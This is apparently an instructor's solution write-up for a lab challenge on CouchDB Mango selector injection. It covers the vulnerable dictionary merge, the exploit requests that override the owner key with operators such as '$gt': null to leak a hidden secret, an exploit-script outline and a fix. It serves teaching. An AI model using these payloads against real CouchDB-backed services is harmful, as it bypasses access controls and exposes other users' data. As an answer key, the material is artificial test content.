# Solution — sqli-couchdb-mango-selector

<!-- Instructor/authoring reference. Students should try the hints first. -->

## What tipped you off

`POST /find` echoes the effective `selector` back in its response. Send
`{"filter": {}}` and you see the server run `{"owner": "guest"}`. Send
`{"filter": {"title": "TODO"}}` and you see `{"owner": "guest", "title": "TODO"}`.
Now send `{"filter": {"owner": "system"}}` and watch the echoed selector become
`{"owner": "system"}` — your key _replaced_ the server's. The access rule and your
input live in the same JSON object, and your value wins. That is the whole bug in
one observation.

## The class of bug

**NoSQL / query-language injection** — CWE-943, OWASP **A03:2021 – Injection**.
The application builds a CouchDB Mango selector partly from server data (the owner
scope) and partly from untrusted client data (the `filter`), and combines them so
that client keys override server keys. There is no SQL here at all: the "query" is
a JSON document, and letting the caller control keys in that document is exactly
as dangerous as letting them control a `WHERE` clause. The concrete impact is a
**broken access control** bypass — a guest reads a document owned by `system`.

## Vulnerability

`src/app.py`, `POST /find`:

```python
OWNER_CONSTRAINT = {"owner": "guest"}
...
selector = {**OWNER_CONSTRAINT, **client_filter}   # client wins on key collision
resp = await client.post(f"/{COUCHDB_DB}/_find",
                         json={"selector": selector, "limit": 50})
```

Python's `{**a, **b}` merge keeps `b`'s value whenever a key appears in both. So
any `owner` key the caller supplies overwrites the server's `owner == "guest"`.
`/solve`, by contrast, never puts client input into a query: it does a fixed
`GET /restricted/flag_holder` and compares the stored `secret` in constant time —
underlining that the bug is the _merge_, not CouchDB.

## Why the developer wrote it this way

The mental model was "the filter narrows the user's own results." Under that model
a shallow merge feels natural and even efficient — one dict, one round-trip, the
constraint always present. It works perfectly for every _honest_ filter, which is
why it survives review: `{"title": "TODO"}` merges to
`{"owner": "guest", "title": "TODO"}` and does exactly what everyone expects. The
failure only appears with a _hostile_ filter that names a key the server also
uses. In a document database the query object and the security predicate are the
same kind of thing (JSON), so "let the user add to the filter" silently means "let
the user edit the security predicate."

## Why it exists

Mango selectors treat top-level keys as an implicit `AND`, and a later assignment
to an existing key is a replacement, not an addition. The server _wanted_
`owner=="guest" AND (user predicate)`, which is `{"$and": [constraint, filter]}`.
What it wrote was `{**constraint, **filter}`, which is only `constraint AND filter`
_when the two share no keys_. The moment the client reuses the `owner` key, the
constraint is gone. And `{"$gt": null}` is a perfectly ordinary Mango operator:
in CouchDB's collation `null` sorts below every real value, so `owner > null`
matches every document that has an `owner`.

## The mechanical exploit

Confirm the merge with the echoed selector, then override the `owner` key:

```
POST /find   {"filter": {}}                                  -> selector {"owner":"guest"}      (your docs only)
POST /find   {"filter": {"owner": {"$gt": null}}}            -> selector {"owner":{"$gt":null}}  (EVERY doc)
POST /find   {"filter": {"owner": {"$gt": null}, "_id": "flag_holder"}}
             -> selector {"owner":{"$gt":null}, "_id":"flag_holder"}  (just the hidden doc)
```

The last request returns the `flag_holder` document, including its `secret`:

```json
{ "selector": {"owner": {"$gt": null}, "_id": "flag_holder"},
  "count": 1,
  "docs": [ { "_id": "flag_holder", "owner": "system",
              "secret": "<leaked-secret>", ... } ] }
```

Take that `secret` and redeem it:

```
GET /solve?secret=<leaked-secret>   ->   { "flag": "FLAG{...}" }
```

Other selector values reach the document just as well — replacing the `owner`
value with `{"$ne": "guest"}`, `{"$regex": "sys.*"}`, or simply `"system"` all
work. The essential move is always the same: _collide with the `owner` key_ so the
server's `"guest"` value is discarded.

## Exploit walkthrough

`tests/exploit.py` (stdlib only) does exactly this:

1. **Baseline check** — `POST /find {"filter": {}}` and confirm the hidden secret
   is _not_ present, so a broken target fails loudly rather than passing by luck.
2. **Override the owner key** — `POST /find` with
   `{"filter": {"owner": {"$gt": null}, "_id": "flag_holder"}}`, with a
   whole-database fallback (`{"owner": {"$gt": null}}`) if the targeted form ever
   returns nothing.
3. **Extract** `flag_holder.secret` (a 16-hex token) from the returned docs.
4. **Redeem** it via `GET /solve?secret=<value>` and read back the flag.
5. **Verify** the flag equals `FLAG{ hmac_sha256(LAB_USER_SECRET, "v1|<slug>") }`
   and print it on the last line.

The whole thing is a couple of HTTP requests — deterministic and well under a
second against localhost.

## Fix

Never let client input choose keys in a security-bearing query object. Compose the
constraint and the (validated) client filter server-side under an explicit `$and`,
so the constraint can never be overridden:

```python
safe_filter = validate(client_filter)          # allowlist keys/operators
selector = {"$and": [{"owner": current_user}, safe_filter]}
resp = await client.post(f"/{db}/_find", json={"selector": selector})
```

Better still, restrict what a caller may express at all: accept a small set of
named, typed search parameters (`title`, `created_after`) and build the selector
yourself, rather than forwarding a raw selector fragment. Defence in depth: give
the API a CouchDB account whose reachable documents are already limited (per-owner
databases, or a validation/design-doc layer), and reject unknown Mango operators.

## Lab-vs-production deviation

- **Secret length.** The seeded `flag_holder.secret` is a 16-hex-character token
  (`secrets.token_hex(8)`) rather than a long credential. Extraction here is a
  single `_find` request, so length does not affect runtime; the short value keeps
  the exploit fast and comfortably inside the 60-second CI budget. A real vault
  secret would be far longer.
- **Response shape.** `/find` echoes the effective `selector` back to make the
  merge observable for teaching. A production API would not reveal how its query
  was assembled, but hiding that echo does not fix the underlying bypass.
- **Access control model.** The "row-level" scope is a single in-app
  `{"owner": "guest"}` predicate rather than real per-tenant CouchDB databases or
  validation design documents. That keeps the lab to one moving part (the merge)
  while still demonstrating the true class of bug.
